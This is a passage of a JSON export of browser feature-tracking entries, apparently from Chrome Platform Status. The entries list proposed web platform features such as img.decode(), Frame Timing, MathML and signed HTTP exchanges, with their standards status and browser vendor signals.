    "summary": "Cookies sent over plaintext HTTP are visible to anyone on the network. This visibility exposes substantial amounts of data to network attackers (passive or active). We know, for example, that long-lived and stable cookies have enabled pervasive monitoring in the past (see Google's PREF cookie), and we know that HTTPS provides significant confidentiality protections against this kind of attack.\r\n\r\nOver time, we should mitigate this risk by capping the lifetime of cookies delivered over HTTP.",
    "id": 5658594150187008,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:55.774210",
      "by": "ericbidelman@google.com"
    },
    "name": "Disallow document.open and document.write during unload",
    "comments": "Note: Edge currently allows document.write while a document is unloading.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html#opening-the-input-stream",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://hg.mozilla.org/mozilla-central/rev/a8bd328a47fb",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dcheng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/583586",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/195496",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Aligns our behavior to match Firefox, Safari, and the spec. Allows potential future simplification of code: there have been a number of bugs in the past related to using document.open during unload.",
    "id": 5702730488217600,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-23 14:35:33.356970",
      "by": "jmedley@google.com"
    },
    "name": "Don't allow popups during page unload",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/844455",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A web page can use the window.open() API to create popups or tabs. This is an easily abused feature, so we have a system in place called the \"popup blocker\" to put strict limits on the use of this API.\r\n\r\nThis would remove the ability of a page to use the window.open() API during page unload, whether or not the popup blocker is enabled. This would simplify browser shutdown and improve our ability to make it correct.",
    "id": 5989473649164288,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-07 18:37:09.919786",
      "by": "xhwang@chromium.org"
    },
    "name": "EME Extension: HDCP Policy Check",
    "tags": [
      "EME",
      "HDCP Policy Check"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1404230",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "xhwang@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=709348",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature provide applications the ability to query whether a certain HDCP policy can be enforced so that playback can be started at the optimum resolution for the best user experience.",
    "id": 5652917147140096,
    "resources": {
      "docs": [
        "https://github.com/WICG/hdcp-detection/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-26 21:02:17.240990",
      "by": "vmpstr@google.com"
    },
    "name": "Filtered elements establish containing blocks",
    "tags": [
      "filter",
      "containing block"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.fxtf.org/filter-effects-1/#FilterProperty",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/fxtf-drafts/issues/11#issuecomment-291739547",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "vmpstr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Compositing>Filters"
        ],
        "flag": false,
        "bug": "https://crbug.com/795549",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to the spec draft:\r\n\r\n“A value other than none for the filter property results in the creation of a containing block for absolute and fixed positioned descendants unless the element it applies to is a document root element in the current browsing context.”\r\n",
    "id": 5666287510355968,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:05.130350",
      "by": "ericbidelman@google.com"
    },
    "name": "Fix Window's members' visibility.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://heycam.github.io/webidl/#Global",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "yukishiino@chromium.org",
          "haraken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=516274",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The current behaviors of Blink about name look-up of Window’s members are not conforming to the spec, and they’re different from other browser’s behaviors.  Let’s fix them.",
    "id": 5764672187793408,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1t5nGcSNaABBBoPNCkDHheCifU1jBu7_AZmjhaXU-O8I/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-25 04:38:38.017150",
      "by": "Patket@microsoft.com"
    },
    "name": "Frame Timing API",
    "tags": [
      "rendering",
      "smoothness"
    ],
    "comments": "API was previously named \"Smoothness Timing\"",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/frame-timing/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1158032",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mpb@google.com",
          "vmpstr@chromium.org",
          "nduca@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=120796",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://status.modern.ie/frametiming",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This specification defines an interface to help web developers measure the rendering performance of their applications in the wild. The API provides frame performance data, as experienced by the end user on their device, to facilitate smoothness measurements (i.e. Frames per Second and Time to Frame). This is done by capturing events for main frame and impl (compositor) thread actions, and exposing them to JavaScript via the Performance Timeline.",
    "id": 5558926443544576,
    "resources": {
      "docs": [
        "https://github.com/w3c/frame-timing/wiki/Explainer",
        "https://www.youtube.com/watch?v=4zoC3eaa9z0"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-03-09 02:08:42.692500",
      "by": "mattreynolds@chromium.org"
    },
    "name": "GamePad multitouch extension",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mattreynolds@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GamepadAPI"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Extend the Gamepad API to support multitouch surfaces.",
    "id": 4782975812108288,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:41.366350",
      "by": "ericbidelman@google.com"
    },
    "name": "HTMLCanvasElement.renderedPixelWidth/Height",
    "comments": "Anticipated issues related to CSS coordinate snapping.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-whatwg-archive/2014Jun/0090.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "junov@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/476067",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Read-only attributes that indicate the intrinsic size that must be set on a canvas for its pixels to map one-to-one to display device pixels.  For applications that wish to render at the device's native resolution.",
    "id": 5477772331843584,
    "resources": {
      "docs": [
        "https://wiki.whatwg.org/wiki/CanvasRenderedPixelSize"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-11-29 22:44:08.389230",
      "by": "vasilvv@chromium.org"
    },
    "name": "HTTP Too Early",
    "tags": [
      "tls",
      "quic"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-httpbis-replay-02",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1406908",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "vasilvv@chromium.org",
          "rch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>SSL"
        ],
        "flag": false,
        "bug": "https://crbug.com/789599",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://lists.w3.org/Archives/Public/ietf-http-wg/2017JulSep/0347.html",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "HTTP error code \"425 Too Early\" is used by a TLS 1.3 or QUIC server to indicate that an HTTP request cannot be processed when it's sent over 0-RTT, and it has to be resent when the full session is established.",
    "id": 5866220553240576,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:59.753050",
      "by": "ericbidelman@google.com"
    },
    "name": "Ignore clicks on recently moved cross-origin iframes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ajuma@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/603193",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Ignore clicks on cross-origin iframes when the location of the click is not within the iframe’s bounds for all draws that occurred within the last 200 ms.",
    "id": 5725822178557952,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1AL9RMFxLRRTQ818Bi7RPjbxF5JPBhti8XWNbLg83LYE/edit?pref=2&pli=1",
        "https://github.com/WICG/interventions/issues/19"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-07-18 22:23:13.254650",
      "by": "domenic@chromium.org"
    },
    "name": "Image Decode API: img.decode()",
    "tags": [
      "image",
      "decode"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#dom-img-decode",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "vmpstr@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Image"
        ],
        "flag": false,
        "bug": "http://crbug.com/705669",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/2037",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This change allows web developers to request to decode an img element. The call to a new HTML <img> element’s decode() function returns a promise, which, when fulfilled, ensures that the image can be appended to the DOM without causing a decoding delay on the next frame.",
    "id": 5637156160667648,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/1920",
        "https://github.com/whatwg/html/issues/2037"
      ],
      "samples": [
        "https://drive.google.com/file/d/0B5cKk7MxQ2LsUUotR3RuWUlpSXc/view",
        "https://drive.google.com/drive/folders/0B5cKk7MxQ2LsNVQzaVVoWHRnVHc"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-10-06 18:31:34.780020",
      "by": "vmpstr@google.com"
    },
    "name": "Image async attribute",
    "tags": [
      "img async",
      "image async"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "vmpstr@chromium.org",
          "chrishtr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Image"
        ],
        "flag": false,
        "bug": "https://crbug.com/772470",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/safari/technology-preview/release-notes/#release-40",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature allows developers to specify async attribute on HTMLImageElement and SVGImageElement which would have one of two states:\r\n“on”: This indicates that the developer prefers responsiveness and performance over atomic presentation of image and non-image content.\r\n“off”: This indicates that the developer prefers atomic presentation of content over responsiveness.\r\n",
    "id": 4897260684967936,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/1920"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-24 23:57:44.266170",
      "by": "Patket@microsoft.com"
    },
    "name": "Independent Properties for CSS Transforms",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-transforms-2/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "soonm@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=696374",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/changelog/desktop/15063/?compareWith=14393",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The following CSS properties are defined:\r\ntranslate\r\nrotate\r\nscale\r\n\r\nThis exposes a simple way for web developers to access transforms in an intuitive way, without having to think about how transform functions in the list interact with each other and during animation.\r\n\r\nThe properties of the transforms are individually animatable.\r\n\r\nThe runtime flag used will be CSSTransformProperties.",
    "id": 5705698193178624,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-04-13 14:47:46.650860",
      "by": "jmedley@google.com"
    },
    "name": "Intent to Deprecate & Remove: Change how New Formatting Contexts sized and positioned off a shape area. ",
    "tags": [
      "layout",
      "css-shapes"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-shapes-1",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ikilpatrick@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=820520",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The shape-outside property allows web developers to wrap text around a float with a non-rectangular area. In our implementation this also currently affects how new formatting contexts are sized and positioned. \r\n\r\nWe want to change how they are sized and positioned, similar to how floats are positioned (based off the bounding area instead).",
    "id": 5226946044624896,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-11-28 19:35:02.434460",
      "by": "dtapuska@chromium.org"
    },
    "name": "KeyboardEventInit keyCode, charCode support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://w3c.github.io/uievents/#legacy-dictionary-KeyboardEventInit",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://crbug.com/679439",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/14858976/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for initializing keyCode, charCode via KeyboardEventInit.",
    "id": 5637291280171008,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:11.377220",
      "by": "ericbidelman@google.com"
    },
    "name": "Local Font Access API",
    "tags": [
      "font",
      "fonts",
      "access"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dhnishi@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=535764",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The local font access API provides access to a device's locally installed fonts, allowing for the development of certain web apps for designers.",
    "id": 6173242628767744,
    "resources": {
      "docs": [
        "https://github.com/DHNishi/LocalFontAccess/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:38.211940",
      "by": "ericbidelman@google.com"
    },
    "name": "MathML",
    "comments": "Chromium turned MathML in M24, but soon disabled it. There are no plans to support it moving forward. See https://code.google.com/p/chromium/issues/detail?id=152430#c43\r\nhttp://blogs.igalia.com/jfernandez/2016/10/09/web-engines-hackfest-2016/",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.w3.org/TR/MathML3/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/174539",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://status.modern.ie/mathml",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An application of XML for describing mathematical notations and capturing both its structure and content.",
    "id": 5240822173794304,
    "resources": {}
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-11-11 17:08:00.652470",
      "by": "bsittler@google.com"
    },
    "name": "Numeric character reference fallback for file upload characters not representable in form-charset",
    "comments": "From https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data :\r\n\r\n\"File names included in the generated multipart/form-data resource (as part of file fields) must use the character encoding selected above, though the precise name may be approximated if necessary (e.g. newlines could be removed from file names, quotes could be changed to \"%22\", and characters not expressible in the selected character encoding could be replaced by other characters).\"\r\n\r\n",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=661819",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "bsittler@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Forms"
        ],
        "flag": false,
        "bug": "https://crbug.com/661819",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=661819#c4",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Change <input type=\"file\"> filename encoding in multipart/form-data uploads in forms with non-Unicode accept-charset to use HTML numeric character references rather than '?' when a filename the user selects contains characters not representable in the target character encoding.\r\n\r\nThis change would align our behavior with the existing behavior of Firefox and Edge. It is hoped that this behavior can eventually achieve cross-browser consensus and standardization.",
    "id": 5634575908732928,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/3223",
        "https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data",
        "https://encoding.spec.whatwg.org/#concept-encoding-process",
        "https://tools.ietf.org/html/rfc7578#section-4.2",
        "https://tools.ietf.org/html/rfc5987#section-3.2"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-02-07 19:52:47.902220",
      "by": "jyasskin@chromium.org"
    },
    "name": "Origin-Signed HTTP Exchanges",
    "tags": [
      "package",
      "packaging",
      "response"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/webpackage/draft-yasskin-http-origin-signed-responses.html",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/29",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "kinuko@chromium.org",
          "jyasskin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "flag": false,
        "bug": "https://crbug.com/803774",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://twitter.com/othermaciej/status/950997728275804160",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows sites to send HTTP request+response pairs (exchanges) that are authoritative for an origin, even when the server itself is not authoritative for that origin.\r\n\r\nThis is part of Web Packaging, which will allow people to share web applications peer-to-peer, while offline, with a proof the app comes from its original author.\r\n\r\nThis also shares some infrastructure with signature-based SRI.",
    "id": 5745285984681984,
    "resources": {
      "docs": [
        "https://github.com/WICG/webpackage/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:50.695650",
      "by": "ericbidelman@google.com"
    },
    "name": "Permission Delegation API for Iframes",
    "tags": [
      "permission",
      "delegation",
      "iframes"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-webappsec/2016Mar/0048.html",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "raymes@chromium.org",
          "palmer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
